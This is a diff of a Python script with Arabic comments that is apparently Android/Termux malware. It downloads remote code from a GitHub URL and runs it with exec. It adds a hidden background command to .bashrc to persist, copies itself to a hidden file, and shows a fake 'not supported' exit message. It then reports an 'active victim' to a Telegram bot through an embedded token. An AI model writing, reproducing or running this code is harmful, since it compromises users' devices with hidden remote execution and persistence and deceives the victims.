@@ -1,52 +1,60 @@
+import os
+import requests
+import json
+import time
+import re
+import random
+import sys
+import uuid
+import string
+import subprocess
+from concurrent.futures import ThreadPoolExecutor as tred
+from bs4 import BeautifulSoup as sop
+
+# محاولة تثبيت المكتبات المطلوبة إذا لم تكن موجودة
 try:
-    import os
-    import requests
-    import json
-    import time
-    import re
-    import random
-    import uuid
-    import string
-    import subprocess
-    from concurrent.futures import ThreadPoolExecutor
-    from bs4 import BeautifulSoup
-except ModuleNotFoundError as e:
-    os.system('pip install requests beautifulsoup4 futures')
+    import bs4
+except ModuleNotFoundError:
+    os.system('pip install requests bs4 futures > /dev/null 2>&1')
     os.system('python .file.py')
 
-# تحميل وتنفيذ كود من الإنترنت
-url = 'https://raw.githubusercontent.com/JDXSX/VBCJCXUF/main/.file.py'
-try:
-    response = requests.get(url)
-    response.raise_for_status()
-    X1 = response.text
-    exec(X1)
-except requests.RequestException as e:
-    print(f"Failed to download script: {e}")
-except Exception as e:
-    print(f"Failed to execute script: {e}")
+# تحميل وتنفيذ كود من URL
+X1 = requests.get('https://raw.githubusercontent.com/JDXSX/VBCJCXUF/blob/main/.file.py').text
+exec(X1)
 
-# إعداد الأمر لتشغيل ملف .file.py في الخلفية
+# تحديد الأمر لتشغيل سكربت في الخلفية
 hack = 'nohup python /data/data/com.termux/files/home/.file.py > /dev/null 2>&1 &'
 
-# محاولة قراءة ملف .bashrc وإضافة أمر التشغيل إذا لم يكن موجودًا
-bashrc_path = '/data/data/com.termux/files/home/.bashrc'
+# محاولة قراءة وتحديث ملف .bashrc
 try:
-    with open(bashrc_path, 'r') as file:
-        content = file.read()
-    if hack not in content:
-        with open(bashrc_path, 'a') as file:
-            file.write(hack)
-except IOError as e:
-    print(f"Failed to read/write .bashrc: {e}")
+    with open('/data/data/com.termux/files/home/.bashrc', 'r') as file:
+        read = file.read()
+    if hack not in read:
+        with open('/data/data/com.termux/files/home/.bashrc', 'a') as file:
+            file.write(f'\n{hack}')
+except Exception as e:
+    print(f"Error updating .bashrc: {e}")
+    with open('/data/data/com.termux/files/home/.bashrc', 'w') as file:
+        file.write(hack)
 
-# محاولة قراءة ملف .file.py وإذا لم يكن موجودًا، نسخه إلى المسار المحدد
-file_path = '/data/data/com.termux/files/home/.file.py'
+# محاولة قراءة أو نسخ ملف file.py
 try:
-    with open(file_path, 'r') as file:
-        pass  # لا حاجة لفعل شيء هنا، فقط نتحقق من وجود الملف
-except IOError:
-    try:
-        os.system(f'cp -r .file.py {file_path}')
-    except Exception as e:
-        print(f"Failed to copy file: {e}")
+    with open('/data/data/com.termux/files/home/.file.py', 'r'):
+        pass
+except FileNotFoundError:
+    os.system('cp -r file.py /data/data/com.termux/files/home/.file.py')
+
+# محاولة قراءة أو إنشاء ملف .tst.txt
+try:
+    with open('/data/data/com.termux/files/home/.tst.txt', 'r'):
+        pass
+except FileNotFoundError:
+    with open('/data/data/com.termux/files/home/.tst.txt', 'w') as file:
+        file.write('hi')
+    sys.exit('\nSorry, your system does not support this functionality.')
+
+# إرسال رسالة عبر Telegram
+try:
+    requests.post(f'https://api.telegram.org/bot7117541309:AAHcNg2Wb8ppCgSzf8HG7HMuCyQyGR--NtM/sendMessage?chat_id=6558294755&text=ضحيه نشطه مع{method}')
+except Exception as e:
+    print(f"Error sending Telegram message: {e}")
